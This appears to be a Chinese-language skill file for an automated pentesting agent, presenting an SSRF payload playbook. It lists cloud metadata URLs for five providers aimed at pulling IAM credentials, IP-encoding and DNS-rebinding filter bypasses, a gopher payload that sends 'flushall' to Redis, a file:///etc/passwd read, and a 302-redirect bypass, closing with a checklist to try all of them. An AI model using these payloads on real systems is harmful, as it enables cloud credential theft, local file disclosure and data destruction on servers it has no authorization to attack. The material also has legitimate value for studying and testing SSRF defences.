---
name: ssrf-construction
description: 原则: 优先打云元数据,不是扫内网端口 目标: 获取云凭证 > 内网探测
category: payload-construction
tags: [server]
---

# SSRF Payload 构造思路

> **原则**: 优先打云元数据,不是扫内网端口
> **目标**: 获取云凭证 > 内网探测

---

## 思路 1: 快速探测

**目标**: 判断是否存在 SSRF

### 1.1 外部回调探测
```
输入: http://your-callback.com
检查: 是否收到请求
→ 如果收到,确认 SSRF
```

### 1.2 内网探测
```
输入: http://127.0.0.1
输入: http://192.168.1.1
检查: 响应差异
→ 如果有差异,确认 SSRF
```

**关键**: 先确认存在 SSRF,再深入利用

---

## 思路 2: 云元数据攻击 (最高优先级)

**目标**: 获取云凭证,价值远超内网探测

### 2.1 AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]
```

### 2.2 阿里云
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### 2.3 腾讯云
```
http://metadata.tencentyun.com/latest/meta-data/
http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/
```

### 2.4 Google Cloud
```
http://metadata.google.internal/computeMetadata/v1/
需要 Header: Metadata-Flavor: Google
```

### 2.5 Azure
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
需要 Header: Metadata: true
```

**关键**: 云元数据 > 内网 Redis/MySQL

---

## 思路 3: IP 绕过

**目标**: 绕过 IP 黑名单

### 3.1 进制转换
```
127.0.0.1 → 2130706433 (十进制)
127.0.0.1 → 0x7f000001 (十六进制)
127.0.0.1 → 017700000001 (八进制)
```

### 3.2 特殊 IP
```
0.0.0.0 → 本地
127.1 → 127.0.0.1
localhost → 127.0.0.1
[::1] → IPv6 本地
```

### 3.3 DNS 重绑定
```
第一次解析 → 外部 IP (通过检查)
TTL 过期后 → 内网 IP (实际请求)
```

**关键**: 根据过滤规则选择绕过方法

---

## 思路 4: 协议利用

**目标**: 利用不同协议攻击内网服务

### 4.1 Gopher 协议 (最强大)
```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
→ 攻击 Redis
```

### 4.2 File 协议
```
file:///etc/passwd
→ 读取本地文件
```

### 4.3 Dict 协议
```
dict://127.0.0.1:6379/info
→ 探测 Redis
```

**关键**: Gopher 可以构造任意 TCP 请求

---

## 思路 5: 302 跳转

**目标**: 绕过 URL 白名单

### 5.1 自建跳转
```
自建服务器返回:
HTTP/1.1 302 Found
Location: http://127.0.0.1

输入: http://your-server.com/redirect
→ 跳转到内网
```

**关键**: 服务端可能跟随 302 跳转

---

## 自我检查清单

- [ ] 是否优先测试了云元数据? (5 家云厂商)
- [ ] 是否用外部回调确认了 SSRF?
- [ ] 是否尝试了 IP 绕过? (进制转换/特殊IP)
- [ ] 是否尝试了 Gopher 协议? (攻击 Redis/MySQL)
- [ ] 是否尝试了 302 跳转?

---

**版本**: v1.0  
**更新日期**: 2026-04-25